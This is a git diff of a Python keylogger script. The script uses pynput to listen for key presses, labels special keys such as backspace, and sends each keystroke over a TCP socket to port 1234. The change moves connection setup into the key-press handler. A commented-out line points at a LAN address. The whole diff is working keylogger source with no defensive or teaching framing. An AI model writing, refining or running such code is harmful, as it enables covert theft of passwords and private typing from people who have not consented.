@@ -3,9 +3,9 @@ import socket
 import pynput
 from pynput.keyboard import Key, Listener
 
-client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+#  client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 #  s.connect(("192.168.0.103", 1234))
-client.connect((socket.gethostname(), 1234))
+#  client.connect((socket.gethostname(), 1234))
 
 
 def on_press(key):
@@ -18,6 +18,8 @@ def on_press(key):
         key = ""
     elif key == "Key.backspace":
         key = " [Backspace] "
+    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    client.connect((socket.gethostname(), 1234))
     client.send(key.encode("utf-8"))
 
 
